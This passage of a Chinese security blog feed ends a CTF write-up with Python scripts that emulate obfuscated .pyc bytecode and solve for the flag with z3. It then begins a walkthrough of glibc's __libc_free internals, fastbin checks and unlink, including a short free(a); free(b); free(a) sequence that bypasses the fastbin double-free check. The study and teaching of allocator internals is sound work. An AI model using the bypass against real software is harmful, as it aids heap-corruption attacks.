class="keyword">None</span>,</div><div class="line">    <span class="string">'OOO0OOO00O00OOOO0'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0OOO0O0O00O00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0O000OO00OO00OO0'</span>: <span class="keyword">None</span>,</div><div class="line">&#125;</div><div class="line">flag = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># n = 1632</span></div><div class="line">n = <span class="number">0</span></div><div class="line">add = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> len(asm) &lt;= n:</div><div class="line">        <span class="keyword">print</span> n</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'q'</span>:  <span class="comment"># JUMP_ABSOLUTE</span></div><div class="line">        n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'n'</span>:  <span class="comment"># JUMP_FORWARD</span></div><div class="line">        n += u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>]) + <span class="number">3</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="comment"># elif asm[n] in one_para:</span></div><div class="line">    <span class="comment">#     dis.disassemble_string(asm[n])</span></div><div class="line">    <span class="comment">#     n+=1</span></div><div class="line">    <span class="comment">#     continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"\x53"</span>:   <span class="comment"># RETURN</span></div><div class="line">        dis.disassemble_string(asm[n])</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"%d: "</span>%n</div><div class="line">        dis.disassemble_string(asm[n:n+<span class="number">3</span>])</div><div class="line">        add = <span class="number">3</span></div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            dis.disassemble_string(asm[n])</div><div class="line">            add = <span class="number">1</span></div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"%d: %d"</span>%(n, ord(asm[n]))</div><div class="line">            <span class="keyword">break</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'d'</span>: <span class="comment"># LOAD_CONST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = code.co_consts[key]</div><div class="line">        stack.append(value)</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'|'</span>: <span class="comment"># LOAD_FAST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = varn[code.co_varnames[key]]</div><div class="line">        stack.append(value)</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'&#125;'</span>:   <span class="comment"># STORE_FAST</span></div><div class="line">        key = code.co_varnames[u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])]</div><div class="line">        varn[key] = stack.pop()</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'k'</span>:   <span class="comment"># COMPARE_OP</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        <span class="keyword">if</span> x1 == x2:</div><div class="line">            flag = <span class="number">1</span></div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"s"</span>:   <span class="comment"># POP_JUMP_IF_TRUE</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">            flag = <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            n += <span class="number">3</span></div><div class="line">    <span class="comment"># elif ord(asm[n]) == 114:  # POP_JUMP_IF_FALSE</span></div><div class="line">    <span class="comment">#     break </span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        n += add</div></pre></td></tr></table></figure>
<hr>
<p>自动跑p函数，使用z3跑出flag自动化脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2.7</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> dis, marshal</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u16</div><div class="line"><span class="keyword">import</span> z3</div><div class="line"></div><div class="line">flag_n = z3.BitVecs(<span class="string">'x__0 x__1 x__2 x__3 x__4 x__5 x__6 x__7 x__8 x__9 x__10 x__11 x__12 x__13 x__14 x__15 x__16 x__17'</span>, <span class="number">8</span>)</div><div class="line"></div><div class="line">f = open(<span class="string">"final.pyc"</span>)</div><div class="line">f.read(<span class="number">8</span>)</div><div class="line"></div><div class="line">code = marshal.load(f)</div><div class="line"></div><div class="line">code = code.co_consts[<span class="number">34</span>]</div><div class="line"><span class="keyword">print</span> code.co_name</div><div class="line">asm = code.co_code</div><div class="line"><span class="comment"># asm = code.co_consts[45].co_code</span></div><div class="line">stack = []</div><div class="line">varn = &#123;</div><div class="line">    <span class="string">'DIVIDER'</span>: <span class="keyword">None</span>,       <span class="comment"># DEVIDER</span></div><div class="line">    <span class="string">'OOO000OOOOOO00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOOO000OO000OOOOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOO0OOO00O00OOOO0'</span>: flag_n,</div><div class="line">    <span class="string">'O0OOO0O0O00O00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0O000OO00OO00OO0'</span>: <span class="keyword">None</span>,</div><div class="line">&#125;</div><div class="line">flag = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># n = 1632</span></div><div class="line">n = <span class="number">0</span></div><div class="line">add = <span class="number">0</span></div><div class="line">index = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> len(asm) &lt;= n:</div><div class="line">        <span class="keyword">print</span> n</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'q'</span> <span class="keyword">or</span> asm[n] == <span class="string">'r'</span>:  <span class="comment"># JUMP_ABSOLUTE    or  POP_JUMP_IF_FALSE</span></div><div class="line">        n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'n'</span>:  <span class="comment"># JUMP_FORWARD</span></div><div class="line">        n += u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>]) + <span class="number">3</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="comment"># elif asm[n] in one_para:</span></div><div class="line">    <span class="comment">#     dis.disassemble_string(asm[n])</span></div><div class="line">    <span class="comment">#     n+=1</span></div><div class="line">    <span class="comment">#     continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"\x53"</span>:   <span class="comment"># RETURN</span></div><div class="line">        dis.disassemble_string(asm[n])</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"%d: "</span>%n</div><div class="line">        dis.disassemble_string(asm[n:n+<span class="number">3</span>])</div><div class="line">        add = <span class="number">3</span></div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            dis.disassemble_string(asm[n])</div><div class="line">            add = <span class="number">1</span></div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"%d: %d"</span>%(n, ord(asm[n]))</div><div class="line">            <span class="keyword">break</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'d'</span>: <span class="comment"># LOAD_CONST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = code.co_consts[key]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'|'</span>: <span class="comment"># LOAD_FAST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = varn[code.co_varnames[key]]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'&#125;'</span>:   <span class="comment"># STORE_FAST</span></div><div class="line">        key = code.co_varnames[u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])]</div><div class="line">        varn[key] = stack.pop()</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'k'</span>:   <span class="comment"># COMPARE_OP</span></div><div class="line">        op = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">if</span> op == <span class="number">3</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            flag_n[index] = (x2==x1)</div><div class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            <span class="keyword">if</span> x1 == x2:</div><div class="line">                flag = <span class="number">1</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"s"</span>:   <span class="comment"># POP_JUMP_IF_TRUE</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">            flag = <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">25</span>):   <span class="comment"># BINARY_SUBSCR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2[x1])</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        index = x1</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">20</span>):   <span class="comment"># BINARY_MULTIPLY</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2*x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">22</span>):   <span class="comment"># BINARY_MODULO</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2%x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">65</span>):   <span class="comment"># BINARY_XOR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2^x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">23</span>):   <span class="comment"># BINARY_ADD</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2+x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        n += add</div><div class="line"></div><div class="line">flag = []</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag_n:</div><div class="line">    s = z3.Solver()</div><div class="line">    s.add(x)</div><div class="line">    s.check()</div><div class="line">    res = s.model()</div><div class="line">    flag.append(res[res[<span class="number">0</span>]])</div><div class="line"></div><div class="line">flag_hex = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> flag:</div><div class="line">    flag_hex += chr(y.as_long())</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag_hex.encode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure>
<p>思路挺简单的，相当于自己实现一个解释器，实现一个stack，因为我代码中的opcode不全，所以只能针对本题，还有几种思路，比如魔改dis，目前的dis是线性的翻译opcode，可以按照我脚本的思路，当遇到JUMP类指令时，也跟随跳转，但是这个不能去除混淆，混淆还是需要自己写代码去，而我上面自动跑flag的脚本思路是来源于Triton，传入的参数是未知的，就设置为符号变量，当分支判断的时候进行响应的处理，进行动态分析，这样就不需要去混淆。</p>
<p>等我把Triton研究清楚了，说不定能用Triton调试pyc？</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/29/0x38/#disqus_thread</comments>
    </item>
    
    <item>
      <title>malloc.c源码阅读之__libc_free</title>
      <link>http://0x48.pw/2017/08/07/0x37/</link>
      <guid>http://0x48.pw/2017/08/07/0x37/</guid>
      <pubDate>Mon, 07 Aug 2017 06:20:04 GMT</pubDate>
      <description>
      
        &lt;p&gt;学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读&lt;code&gt;__libc_free&lt;/code&gt;函数，一篇是读&lt;code&gt;__libc_malloc&lt;/code&gt;函数，本篇是读&lt;code&gt;free&lt;/code&gt;函数的源码。之后有空可能还会写&lt;code&gt;calloc&lt;/code&gt;或者&lt;code&gt;realloc&lt;/code&gt;&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读<code>__libc_free</code>函数，一篇是读<code>__libc_malloc</code>函数，本篇是读<code>free</code>函数的源码。之后有空可能还会写<code>calloc</code>或者<code>realloc</code></p>
<a id="more"></a>
<p>读代码使用的是<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></p>
<p>PS: 默认研究64位</p>
<p>首先是我画的总的流程图，顺着流程图来</p>
<p><img src="http://qn.lazysheep.cc/img/free1.png" alt="free1"></p>
<h2 id="libc-free-void-mem"><a href="#libc-free-void-mem" class="headerlink" title="__libc_free(void *mem)"></a>__libc_free(void *mem)</h2><p><code>free</code>在malloc.c中定义在<code>__libc_free</code>函数中，只有一个参数<code>void *mem</code>，需要free的地址。</p>
<p>首先是检查<code>__free_hook</code>，在<code>main_arena</code>前面有个地方是储存<code>malloc_hook</code>和<code>free_hook</code>的地方(0CTF 2017 Babyheap中有涉及)，如果该值不为NULL(0)，则把<code>mem</code>当做参数，执行<code>free_hook</code>，执行结束后直接return，就不执行<code>free</code>的后续代码了</p>
<p>如果不存在<code>free_hook</code>，这一步是检查<code>mem == 0</code>，如果true，则直接return</p>
<p>如果false，则根据mem对p进行赋值，mem指向的是chunk中储存数据的地方，p是指向chunk header的地方。比如32位系统，<code>p = mem-8</code>，64位系统则是<code>p=mem-16</code></p>
<p>然后根据chunk size的第二个标志位来判断该地址空间是否是由mmap分配的，如果true，也就是标志位为1，则执行一系列操作(暂不研究mmap相关的操作，先研究brk)，然后执行<code>munmap_chunk(p)</code>，然后执行return</p>
<p>如果标志位为0(false)，则根据第三个(最高位)标志位判断该chunk是否不属于<code>main_arena</code>，如果标志位为0，表示属于，则把<code>main_arena</code>的地址赋值给<code>ar_ptr</code></p>
<p>接下来把<code>ar_ptr</code>和<code>p</code>当做参数，去执行<code>_int_free</code>函数：<code>_int_free(ar_ptr, p, 0)</code></p>
<h2 id="int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="_int_free(mstate av, mchunkptr p, int have_lock)"></a>_int_free(mstate av, mchunkptr p, int have_lock)</h2><p>这里提一下，参数中的mstate表示的是<code>malloc_state</code>结构体也就是<code>main_arena</code>的结构体，<code>mchunkptr</code>表示的是<code>malloc_chunk</code>的结构体（PS：如果结构体还不知道，就别来学堆了）</p>
<p>在写blog的过程中发现了一个别人做的流程图，而且做的挺不错了，所以我就懒得自己画了，而且画的挺全的，之后的malloc的流程图也直接用这个了：</p>
<p><img src="http://qn.lazysheep.cc/img/heap.png" alt="free2"></p>
<h3 id="未区分bin之前"><a href="#未区分bin之前" class="headerlink" title="未区分bin之前"></a>未区分bin之前</h3><p>在未通过size来判断该chunk free之后是处于哪个bin之前，有进行一些通用检测，代码不长，也挺简单的。</p>
<ol>
<li>get chunksize，通过p-&gt;mchunksize，去掉标志位后获取chunk的size</li>
<li>检查p的合法性</li>
<li>检查size的合法性</li>
</ol>
<p>####检查p的合法性</p>
<p>有两个判断，一个是需要<code>p &lt; (-size)</code>，比如在64位系统中，地址最大是8byte的，如果<code>p &gt; (-size)</code>，那么<code>p + size</code>就超出了合法的地址空间。还有一个检查是对齐的问题，比如64位系统是0x10对齐，所以一个合法的地址都是0x10的倍数，如果<code>p &amp; 0xf != 0</code>就表示p不是16的倍数，则不是一个合法的地址。</p>
<p>总结下，如果<code>p &gt; (-size) || (p&amp;0xf)</code>为true ，判断出属于非法地址则报错(<code>free(): invalid pointer</code>)退出(报错具体的操作暂时不想详细研究)。</p>
<h4 id="检查size的合法性"><a href="#检查size的合法性" class="headerlink" title="检查size的合法性"></a>检查size的合法性</h4><p>检查完地址的合法性后就是检查size的合法性，一个是大小问题，首先要<code>size &gt;= MINSIZE</code>，然后因为地址已经是0x10对齐了，所以去掉标志位的size也应该要是0x10的倍数，<code>size &amp; 0xf == 0</code>，其实我觉得这个检查没必要，因为size赋值的时候已经把标志位清零了，然后这期间也没有size的赋值操作了。</p>
<p>总结下，如果<code>size &lt; MINSIZE || size&amp;0xf</code>为true，则表示无效的size，报错(<code>free(): invalid size</code>)退出。</p>
<h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>在进行chunk的一些简单的check之后，就是进入各个bin的分支了，首先是fastbin分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div></pre></td></tr></table></figure>
<p>如果size小于等于fastbin的最大size，则进入fastbin分支。大致流程如下：</p>
<ol>
<li>下一个chunk的size要大于2*SIZE_SZ</li>
<li>下一个chunk的size要小于arena-&gt;system_mem</li>
<li>arena-&gt;flags最后一bit清零</li>
<li>根据size获取该chunk该放进哪个fastbin</li>
<li>fastbin中原本的值不能等于当前chunk的地址</li>
<li>如果fastbin不为空，获取size对应的index</li>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
<li>fastbin entry判断</li>
</ol>
<p>fastbin的流程很简单，大致就上面9个步骤</p>
<h4 id="next-chunk-size-check"><a href="#next-chunk-size-check" class="headerlink" title="next chunk size check"></a>next chunk size check</h4><p>通过当前chunk的地址加上size，就可以得到下一个chunk。然后获取到下一个chunk的size，对其上下限进行判断，需要大于0x10，小于heap的总size</p>
<p>检查完以后，下面执行了两个函数，一个是<code>free_perturb</code>，目的是对chunk的data块通过memset赋值，但是默认情况下是不进行操作。也就是说，我们可以通过设置，把free后的chunk的data区域赋值，但是不能赋值成<code>\x00</code></p>
<p>然后是<code>set_fastchunks</code>，作用是对arena的flags标志位的最低bit清零</p>
<h4 id="判断fastbin大小"><a href="#判断fastbin大小" class="headerlink" title="判断fastbin大小"></a>判断fastbin大小</h4><p>之前我写个fastbin专题的博客，如果有基础的就知道，fastbin其实是一个长度为10的数组fastbinsY</p>
<p>index从0，1，2……开始长度是0x20，0x30，0x40……(放不满的问题之前博客中说过)</p>
<p>所以首先是根据size获取到index，具体的运算是<code>(size &gt;&gt; 4) - 2</code>，  </p>
<p>然后根据index从fastbinY中取地址和取值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fd = &amp;fastbinsY[index];</div><div class="line">old = *fd;</div></pre></td></tr></table></figure>
<h4 id="2free-check"><a href="#2free-check" class="headerlink" title="2free check"></a>2free check</h4><p>fastbin中也有一个简单的对2free的check，如果<code>old == p</code>，则报2free的error(<code>double free or corruption(fasttop)</code>)</p>
<p>逻辑很简单，old是在fastbin中的值，表示已经被free过，如果再free就是2free了</p>
<p>要bypass也很简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">free</span>(a)</div><div class="line"><span class="built_in">free</span>(b)</div><div class="line"><span class="built_in">free</span>(a)</div></pre></td></tr></table></figure>
<h4 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h4><p>fastbin是一个单向链表，所以下面就是单链表插入操作，逻辑也挺简单的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p-&gt;fd = old</div><div class="line">fastbinsY[index] = p</div></pre></td></tr></table></figure>
<p>PS: 实际代码这里很迷，是一个循环，但是我觉得是循环不起来的</p>
<h4 id="fastbin-entry-check"><a href="#fastbin-entry-check" class="headerlink" title="fastbin entry check"></a>fastbin entry check</h4><p>最后是对fastbin entry进行检查，在单链表插入操作之前还有一个操作，如果<code>old!=NULL</code>，也就是说当前index的fastbin如果不是空链表，我们就要获取原本fastbinsY[index]的index，具体操作是<code>old_index = (old-&gt;chunksize &gt;&gt; 4) - 2</code>，最后再对两个index进行判断，如果<code>index != old_index</code>，则表示两个index不同的chunk竟然放在同一个链表中，肯定有问题啊，然后报错退出(<code>invalid fastbin entry (free)</code>)</p>
<p>如果是free一个fastbin chunk的话，执行完上面的逻辑，free函数就可以return了，我们可以看到fastbin的free过程只做了一些简单的判断，然后只进行了单链表操作，对于inuse标志位却没有处理</p>
<p>PS: 这之中还有一些的多线程情况下lock的问题，暂不研究</p>
<h3 id="非fastbin的情况"><a href="#非fastbin的情况" class="headerlink" title="非fastbin的情况"></a>非fastbin的情况</h3><p>对smallbin, largenbin, unsortbin的操作都在这个分支中，基本流程如下：</p>
<ol>
<li>判断是否是使用mmap分配的内存空间</li>
<li>获取下一个chunk的地址</li>
<li>进行3个double free check</li>
<li>获取下一个chunk的size，并对其进行check</li>
<li>调用free_perturb函数，上面讲过</li>
<li>前置合并操作，逻辑如下：<ol>
<li>上一个chunk处于空闲状态</li>
<li>获取上一个chunk的size，并加到当前chunk的size中去</li>
<li>获取上一个chunk的地址</li>
<li>unlink上一个chunk</li>
</ol>
</li>
<li>判断下一个chunk是否是top chunk，如果是见下面流程，不是，跳到8<ol>
<li>当前size加上下一个chunk的size</li>
<li>把加好后的size赋值给当前chunk的size</li>
<li>arena执行top chunk的指针改指向当前chunk</li>
</ol>
</li>
<li>判断下一个chunk是否是空闲状态，如果是见下面流程，如果不是，跳到9<ol>
<li>unlink下一个chunk</li>
<li>当前size加上下一个chunk的size</li>
</ol>
</li>
<li>清除下一个chunk的inuse标志位</li>
<li>获取unsortbin地址</li>
<li>获取unsortbin-&gt;fd地址</li>
<li>进行unsort chunk check</li>
<li>当前chunk-&gt;fd = unsortbin-&gt;fd</li>
<li>当前chunk-&gt;bk = unsortbin</li>
<li>如果当前chunk不是smallbin，把fd_nextsize/bk_nextsize清零</li>
<li>unsortbin-&gt;fd-&gt;bk = 当前chunk</li>
<li>unsortbin-&gt;fd = 当前chunk</li>
<li>设置当前chunk的size，inuse标志位为1，设置下一个chunk的pre_size</li>
<li>如果size&gt;65536则…….</li>
</ol>
<h4 id="double-free-check"><a href="#double-free-check" class="headerlink" title="double free check"></a>double free check</h4><p>共有三个check，首先是当前chunk不能是top chunk，也就是top chunk不能被free，第二个check是检查下一个chunk的地址不能大于top chunk的地址加上top chunk的size，因为在brk分配得到的一个堆中，top chunk是末尾的chunk，所以top chunk之后是不存在其他chunk的，第三个是检查下一个chunk的inuse标志位，只有当前chunk是inuse状态，才能被free。</p>
<p>之后是对下一个chunk的size进行check，也就是上下限检查。</p>
<h4 id="前向合并操作"><a href="#前向合并操作" class="headerlink" title="前向合并操作"></a>前向合并操作</h4><p>如果上一个chunk是处于空闲状态，当前chunk就要和上一个chunk进行合并。逻辑也很简单，因为上一次chunk是处于空闲状态，所以当前chunk的pre_size可以获取到上一个chunk的size，和当前chunk的size相加，形成新的size，当前chunk的地址减去pre_size，获得上一个chunk的地址，而上一个chunk的地址将赋值给当前chunk。然后对上一个chunk进行unlink操作，把上一个chunk从bin的链表中删除。</p>
<h4 id="向后合并操作"><a href="#向后合并操作" class="headerlink" title="向后合并操作"></a>向后合并操作</h4><p>向后合并操作有两种情况，一种是下一chunk是处于空闲状态的chunk，另一种是下一个chunk是top chunk。如果下一个chunk是top chunk，首先获取到下一个chunk的size加上当前chunk的size形成新的size，并储存到当前chunk的size位，然后把arena的top chunk指针设置成当前chunk的地址，这样就完成了把当前chunk合并进top chunk的操作。</p>
<p>可以通过下下个chunk的inuse标志位判断下一个chunk是否处于空闲状态，如果处于inuse状态，这把下一个chunk的inuse标志位置零，表示当前chunk处于空闲状态，如果下一个chunk处于空闲状态，则需要进行向后合并操作。首先是unlink下一个chunk，把下一个chunk从bin的链表中删去，然后当前size加上下一个chunk的size。</p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>首先是获取下一个chunk的pre_size，和当前chunk的size进行比较，因为传入unlink的chunk都是处于空闲状态，所以下一个chunk的pre_size位是有效值。之后是进行一个比较经典的check：<code>P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code>，当该check通过后就是删除当前链表的操作了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd = FD</div><div class="line">P-&gt;bk = BK</div></pre></td></tr></table></figure>
<p>这些都算是链表中比较经典的操作了。</p>
<p>然后是，如果当前chunk是largebin，还会对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行一些操作。这两个也是指针变量，但是在free函数中基本没有对这两个指针进行操作赋值，所以还不清楚具体含义，等看完malloc函数再进行研究。</p>
<h4 id="把当前chunk加入到unsortbin中"><a href="#把当前chunk加入到unsortbin中" class="headerlink" title="把当前chunk加入到unsortbin中"></a>把当前chunk加入到unsortbin中</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div 